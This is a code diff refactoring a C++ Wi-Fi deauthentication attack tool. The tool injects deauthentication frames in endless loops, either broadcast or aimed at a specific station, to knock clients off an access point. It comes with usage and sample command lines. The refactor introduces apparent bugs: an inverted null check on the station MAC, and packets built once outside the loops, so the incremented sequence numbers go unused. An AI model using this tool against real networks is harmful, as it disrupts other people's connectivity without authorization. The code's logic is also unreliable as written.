@@ -7,35 +7,30 @@
 
 using namespace std;
 
-void usage() {
-    printf("syntax : deauth-attack-test <interface> <ap mac> [<station mac> [-auth]]\n");
-    printf("sample : deauth-attack-test mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
-}
-
 struct Param {
-    char* dev_;
-    char* apMac_;
-    char* stMac_;
-    bool authMode_;
-} param = {
-    .dev_ = NULL,
-    .apMac_ = NULL,
-    .stMac_ = NULL,
-    .authMode_ = false
-};
+    char* dev_ = nullptr;
+    Mac apMac_{ Mac::nullMac() };
+    Mac stMac_{ Mac::nullMac() };
+    bool authMode_ = false;
+
+    static void usage() {
+        printf("syntax : deauth-attack-test <interface> <ap mac> [<station mac> [-auth]]\n");
+        printf("sample : deauth-attack-test mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
+    }
+} param;
 
 int main(int argc, char* argv[]) {
     if (argc < 3) {
-        usage();
+        Param::usage();
         return -1;
     }
 
     param.dev_ = argv[1];
-    param.apMac_ = argv[2];
+    param.apMac_ = Mac(argv[2]);
 
     if (argc >= 4) {
         if (strcmp(argv[3], "-auth") != 0) {
-            param.stMac_ = argv[3];
+            param.stMac_ = Mac(argv[3]);
         } else {
             param.authMode_ = true;
         }
@@ -56,7 +51,7 @@ int main(int argc, char* argv[]) {
     // Parse MAC Address
     Mac apMac(param.apMac_);
     Mac stMac;
-    if (param.stMac_ != NULL) {
+    if (param.stMac_.isNull()) {
         stMac = Mac(param.stMac_);
     }
 
@@ -65,18 +60,19 @@ int main(int argc, char* argv[]) {
 
     DeauthPkt deauthPkt(pcap, apMac, stMac, param.authMode_);
 
-    if (param.stMac_ == NULL) {
+    if (param.stMac_.isNull()) {
         // Broadcast Mode
         printf("=== Broadcast Mode ===\n");
         printf("AP MAC : %s\n", apMac.toString().c_str());
         printf("TARGET : FF:FF:FF:FF:FF:FF (broadcast)\n\n");
 
-        Mac target = Mac::broadcast();
+        Mac target{ Mac::broadcastMac() };
         int count = 0;
         uint16_t seq = 0;
 
+        std::vector<uint8_t> pkt = deauthPkt.createDeauth(target, apMac, apMac, seq);
+
         while (1) {
-            std::vector<uint8_t> pkt = deauthPkt.createDeauth(apMac, target, apMac, seq);
             seq++;
 
             int res = pcap_inject(pcap, pkt.data(), pkt.size());
@@ -87,7 +83,7 @@ int main(int argc, char* argv[]) {
             printf("[%d] Deauth Packet sended.\n", ++count);
             usleep(100000);
         }
-    } else if (param.stMac_ != NULL && param.authMode_ == false) {
+    } else if (!param.stMac_.isNull() && param.authMode_ == false) {
         // Unicast Mode
         printf("=== Unicast Mode ===\n");
         printf("AP MAC : %s\n", apMac.toString().c_str());
@@ -97,8 +93,10 @@ int main(int argc, char* argv[]) {
         uint16_t seq_ap = 0;
         uint16_t seq_st = 0;
 
+        std::vector<uint8_t> pkt_ap = deauthPkt.createDeauth(apMac, stMac, apMac, seq_ap);
+        std::vector<uint8_t> pkt_st = deauthPkt.createDeauth(stMac, apMac, apMac, seq_st);
+
         while (1) {
-            std::vector<uint8_t> pkt_ap = deauthPkt.createDeauth(apMac, stMac, apMac, seq_ap);
             seq_ap++;
 
             int res_ap = pcap_inject(pcap, pkt_ap.data(), pkt_ap.size());
@@ -108,7 +106,6 @@ int main(int argc, char* argv[]) {
             }
             usleep(50000);
 
-            std::vector<uint8_t> pkt_st = deauthPkt.createDeauth(stMac, apMac, apMac, seq_st);
             seq_st++;
 
             int res_st = pcap_inject(pcap, pkt_st.data(), pkt_st.size());
